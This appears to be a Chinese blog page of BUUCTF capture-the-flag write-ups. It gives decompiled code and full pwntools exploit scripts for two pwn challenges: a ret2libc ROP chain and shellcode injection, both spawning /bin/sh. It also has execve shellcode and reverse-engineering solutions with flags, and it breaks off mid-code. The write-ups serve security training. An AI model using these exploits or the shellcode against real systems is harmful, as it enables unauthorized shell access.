<p>?一脸懵，运行就getShell？</p>
<h2 id="images-OGeek2019-images-babyrop"><a href="#images-OGeek2019-images-babyrop" class="headerlink" title="&#x2F;images&#x2F;[OGeek2019&#x2F;images&#x2F;]babyrop"></a>&#x2F;images&#x2F;[OGeek2019&#x2F;images&#x2F;]babyrop</h2><h3 id="分析：-12"><a href="#分析：-12" class="headerlink" title="分析："></a>分析：</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/OGeek_baby_rop_file.png"
                      alt="OGeek_baby_rop_file"
                ><br>32位ELF可执行应用程序，动态链接，开启RELRO和NX保护。<br>IDA Pro加载：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> buf; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  inti();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">    read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = sub_804871F(buf);</span><br><span class="line">  sub_80487D0(v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_804871F</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [esp+2Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">ssize_t</span> v5; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%ld&quot;</span>, a1);</span><br><span class="line">  v5 = read(<span class="number">0</span>, buf, <span class="number">0x20u</span>);</span><br><span class="line">  buf[v5 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, s, v1) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Correct/images/n&quot;</span>, <span class="number">8u</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> __int8)buf[<span class="number">7</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __cdecl <span class="title function_">sub_80487D0</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">231</span>]; <span class="comment">// [esp+11h] [ebp-E7h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">127</span> )</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">200u</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>main函数获取一个随机数，传入sub_804871F函数，要求我们输入，如果我们输入与随机数不相等则退出，如果相等，则返回buf[7]，该返回值进入sub_80487D0函数，如果该参数为127，我们就可以输入200个字节，如果不等于127，则我们可以输入与该返回值相等字节的数据。</p>
<h3 id="利用思路：-9"><a href="#利用思路：-9" class="headerlink" title="利用思路："></a>利用思路：</h3><p>首先，要利用栈溢出，使得我们输入与随机数相等，这样我们才能进入后续逻辑，然后，我们要保证buf[7]等于127或者要大于等于我们payload的大小。</p>
<h3 id="EXP：-1"><a href="#EXP：-1" class="headerlink" title="EXP："></a>EXP：</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;i386&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;../libc/libc.so-32.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">payload1 = <span class="string">b&#x27;/images/x00&#x27;</span> * <span class="number">7</span> + <span class="string">b&#x27;/images/xff&#x27;</span> + <span class="string">b&#x27;a&#x27;</span></span><br><span class="line">io.send(payload1)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0xEB</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x08048825</span></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * padding + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Correct/images/n&#x27;</span>,payload2)</span><br><span class="line"></span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;write_addr : &quot;</span> + <span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libc_base = write_addr - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">str_bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base : &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system_addr : &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;str_bin_sh_addr &quot;</span> + <span class="built_in">hex</span>(str_bin_sh_addr))</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p32(system_addr) + p32(<span class="number">0</span>) + p32(str_bin_sh_addr)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Correct/images/n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/OGeek_baby_rop_flag.png"
                      alt="OGeek_baby_rop_flag"
                ></p>
<h2 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h2><h3 id="分析：-13"><a href="#分析：-13" class="headerlink" title="分析："></a>分析：</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/ciscn_2019_n_5_file.png"
                      alt="ciscn_2019_n_5_file"
                ><br>64位ELF可执行应用程序，动态链接，没有开启任何保护。<br>IDA Pro加载：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> text[<span class="number">30</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;tell me your name&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, name, <span class="number">0x64u</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;wow~ nice name!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want to say to me?&quot;</span>);</span><br><span class="line">  gets(text);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>程序很简单，向bss段输入name，向栈上输入text，有很明显的栈溢出。</p>
<h2 id="利用思路：-10"><a href="#利用思路：-10" class="headerlink" title="利用思路："></a>利用思路：</h2><p>栈溢出输入shellcode并执行。<br>网上找一段<a class="link"   href="https://shell-storm.org/shellcode/files/shellcode-909.html" >shellcode<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line"></span><br><span class="line"><span class="meta">#execve(<span class="string">&quot;/bin/bash&quot;</span>,&#123;NULL&#125;,&#123;NULL&#125;)</span></span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">	mov rax, <span class="number">0x68732f6e69622f</span></span><br><span class="line">	push rax</span><br><span class="line">	push rsp</span><br><span class="line">	pop rdi</span><br><span class="line">	xor eax, eax</span><br><span class="line">	push rax</span><br><span class="line">	mov al, <span class="number">59</span></span><br><span class="line">	push rsp</span><br><span class="line">	pop rdx</span><br><span class="line">	push rsp</span><br><span class="line">	pop rsi</span><br><span class="line">	syscall</span><br><span class="line"></span><br><span class="line"><span class="meta"># as -o sc.o sc.s</span></span><br><span class="line"><span class="meta"># objcopy -O binary -j .text sc.o sc.bin</span></span><br><span class="line"><span class="meta"># xxd -i -n sc sc.bin</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># unsigned char sc[] = &#123;</span></span><br><span class="line">#   <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x50</span>, <span class="number">0x54</span>,</span><br><span class="line">#   <span class="number">0x5f</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x50</span>, <span class="number">0xb0</span>, <span class="number">0x3b</span>, <span class="number">0x54</span>, <span class="number">0x5a</span>, <span class="number">0x54</span>, <span class="number">0x5e</span>, <span class="number">0x0f</span>, <span class="number">0x05</span></span><br><span class="line"># &#125;;</span><br><span class="line"><span class="meta"># unsigned int sc_len = 24;</span></span><br><span class="line"></span><br><span class="line"># Fnknda&lt;joao[at]fukuda[dot]sh&gt;</span><br></pre></td></tr></table></figure></div>
<h3 id="EXP-11"><a href="#EXP-11" class="headerlink" title="EXP:"></a>EXP:</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./ciscn_2019_n_5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;name/images/n&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">io.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;me?/images/n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span> + p64(<span class="number">0x601080</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>































<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="buuctf-easyre"><a href="#buuctf-easyre" class="headerlink" title="buuctf-easyre"></a>buuctf-easyre</h2><p>DIE查壳：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/buuctf-easyre_1.png"
                      alt="buuctf-easyre_1"
                ><br>无壳，PE64位文件，C&#x2F;C++编写。<br>尝试运行：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/buuctf-easyre_2.png"
                      alt="buuctf-easyre_2"
                ><br>IDA Pro加载，可以看到很清晰的逻辑：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> b; <span class="comment">// [rsp+28h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> a; <span class="comment">// [rsp+2Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">  <span class="keyword">if</span> ( a == b )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag&#123;this_Is_a_EaSyRe&#125;&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sorry,you can&#x27;t get flag&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>flag{this_Is_a_EaSyRe}</p>
<h2 id="buuctf-reverse1"><a href="#buuctf-reverse1" class="headerlink" title="buuctf-reverse1"></a>buuctf-reverse1</h2><p>DIE查壳：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/buuctf-reverse1_1.png"
                      alt="buuctf-reverse1_1"
                ><br>无壳，PE64位文件，C&#x2F;C++编写。<br>尝试运行：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/buuctf-reverse1_2.png"
                      alt="buuctf-reverse1_2"
                ><br>IDA Pro加载：<br>逻辑也很简单，只是将’o’换成了’0‘：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">char</span> Str1[<span class="number">224</span>]; <span class="comment">// [rsp+48h] [rbp+28h] BYREF</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+128h] [rbp+108h]</span></span><br><span class="line"></span><br><span class="line">  v3 = &amp;v7;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">82</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v3 = <span class="string">&#x27;/images/xCC/images/xCC/images/xCC/images/xCC&#x27;</span>;</span><br><span class="line">    v3 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = j;</span><br><span class="line">    <span class="keyword">if</span> ( j &gt; j_strlen(Str2) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( Str2[j] == <span class="string">&#x27;o&#x27;</span> )</span><br><span class="line">      Str2[j] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_1400111D1(<span class="string">&quot;input the flag:&quot;</span>);</span><br><span class="line">  sub_14001128F(<span class="string">&quot;%20s&quot;</span>, Str1);</span><br><span class="line">  v5 = j_strlen(Str2);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(Str1, Str2, v5) )</span><br><span class="line">    sub_1400111D1(<span class="string">&quot;this is the right flag!/images/n&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    sub_1400111D1(<span class="string">&quot;wrong flag/images/n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>flag{hell0_w0rld}</p>
<h2 id="buuctf-reverse2"><a href="#buuctf-reverse2" class="headerlink" title="buuctf-reverse2"></a>buuctf-reverse2</h2><p>DIE查壳：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/buuctf-reverse2.png"
                      alt="buuctf-reverse2"
                ><br>64位ELF文件，无壳，C语言编写<br>这里直接IDA Pro加载：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> stat_loc; <span class="comment">// [rsp+4h] [rbp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">__pid_t</span> pid; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  pid = fork();</span><br><span class="line">  <span class="keyword">if</span> ( pid )</span><br><span class="line">  &#123;</span><br><span class="line">    waitpid(pid, &amp;stat_loc, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="built_in">strlen</span>(&amp;flag); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(&amp;flag + i) == <span class="string">&#x27;i&#x27;</span> || *(&amp;flag + i) == <span class="string">&#x27;r&#x27;</span> )</span><br><span class="line">        *(&amp;flag + i) = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input the flag:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%20s&quot;</span>, s2);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;flag, s2) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;this is the right flag!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;wrong flag!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>逻辑还是很简单，只是将<code>&#123;hacking_for_fun&#125;</code>字符串中的’i’和’r’换成了’1’。<br>flag{hack1ng_fo1_fun}</p>
<h2 id="buuctf-内涵的软件"><a href="#buuctf-内涵的软件" class="headerlink" title="buuctf-内涵的软件"></a>buuctf-内涵的软件</h2><p>DIE查壳：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/buuctf-%E5%86%85%E6%B6%B5%E7%9A%84%E8%BD%AF%E4%BB%B6.png"
                      alt="buuctf-内涵的软件"
                ><br>无壳，32位PE文件，C语言编写<br>尝试运行：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/buuctf-%E5%86%85%E6%B6%B5%E7%9A%84%E8%BD%AF%E4%BB%B6_1.png"
                      alt="buuctf-内涵的软件_1"
                ><br>提示需要我们逆向，初步猜测需要我们找到变量内存即可。<br>IDA Pro加载：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">4</span>]; <span class="comment">// [esp+4Ch] [ebp-Ch] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// [esp+50h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+54h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  i = <span class="number">5</span>;</span><br><span class="line">  v5 = <span class="string">&quot;DBAPP&#123;49d3c93df25caad81232130f3d2ebfad&#125;&quot;</span>;</span><br><span class="line">  <span class="keyword">while</span> ( i &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(aD, i);</span><br><span class="line">    sub_40100A();</span><br><span class="line">    --i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;/images/n&quot;</span></span><br><span class="line">    <span class="string">&quot;/images/n&quot;</span></span><br><span class="line">    <span class="string">&quot;/images/n&quot;</span></span><br><span class="line">    <span class="string">&quot;这里本来应该是答案的,但是粗心的程序员忘记把变量写进来了,你要不逆向试试看:(Y/N)/images/n&quot;</span>);</span><br><span class="line">  v4[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>, v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4[<span class="number">0</span>] == <span class="string">&#x27;Y&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(aOdIda);</span><br><span class="line">    <span class="keyword">return</span> sub_40100A();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[<span class="number">0</span>] == <span class="string">&#x27;N&#x27;</span> )</span><br><span class="line">      <span class="built_in">printf</span>(asc_425034);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;输入错误,没有提示.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> sub_40100A();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>DBAPP{49d3c93df25caad81232130f3d2ebfad}</p>
<h2 id="buuctf-新年快乐"><a href="#buuctf-新年快乐" class="headerlink" title="buuctf-新年快乐"></a>buuctf-新年快乐</h2><p>DIE查壳：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/buuctf-%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90.png"
                      alt="buuctf-新年快乐"
                ><br>32位PE文件，UPX加壳，C语言编写<br>首先使用UPX工具脱壳：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/buuctf-%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90_1.png"
                      alt="buuctf-新年快乐_1"
                ></p>
<h3 id="手工脱壳："><a href="#手工脱壳：" class="headerlink" title="手工脱壳："></a>手工脱壳：</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/buuctf-%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90_2.png"
                      alt="buuctf-新年快乐_2"
                ><br>这里看到了<code>pushad</code>，我们可以尝试找一下<code>popad</code>，或者我们给<code>esp</code>下一个硬件访问断点：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/buuctf-%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90_3.png"
                      alt="buuctf-新年快乐_3"
                ><br>首先使用寻找<code>pushad</code>的方法，可以看到<code>popad</code>之后，还有一个平衡堆栈的操作，完成之后使用<code>jmp</code>跳转到程序真正的入口点。<br>然后我们来尝试一下硬件断点的方法：<br>我们在<code>pushad</code>之后，就给<code>esp</code>的位置下一个硬件访问断点：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/buuctf-%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90_4.png"
                      alt="buuctf-新年快乐_4"
                ><br>然后直接F9运行，发现程序还是暂停在了<code>popad</code>之后的位置：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/buuctf-%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90_5.png"
                      alt="buuctf-新年快乐_5"
                ><br>然后我们直接dump即可。<br>然后IDA Pro加载即可(这里要注意一点，如果是手工脱壳，需要恢复符号表）：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> Str2[<span class="number">14</span>]; <span class="comment">// [esp+12h] [ebp-3Ah] BYREF</span></span><br><span class="line">  <span class="type">char</span> Str1[<span class="number">44</span>]; <span class="comment">// [esp+20h] [ebp-2Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  <span class="built_in">strcpy</span>(Str2, <span class="string">&quot;HappyNewYear!&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(Str1, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;please input the true flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str1);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(Str1, Str2, <span class="built_in">strlen</span>(Str2)) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;this is true flag!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;wrong!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>flag{HappyNewYear}</p>
<h2 id="buuctf-xor"><a href="#buuctf-xor" class="headerlink" title="buuctf-xor"></a>buuctf-xor</h2><p>DIE查壳：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/buuctf-xor.png"
                      alt="buuctf-xor"
                ><br>无壳，C&#x2F;C++编写。<br>IDA Pro加载：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-124h]</span></span><br><span class="line">  <span class="type">char</span> __b[<span class="number">264</span>]; <span class="comment">// [rsp+40h] [rbp-110h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(__b, <span class="number">0</span>, <span class="number">0x100u</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input your flag:/images/n&quot;</span>);</span><br><span class="line">  get_line(__b, <span class="number">256LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(__b) != <span class="number">33</span> )</span><br><span class="line">    <span 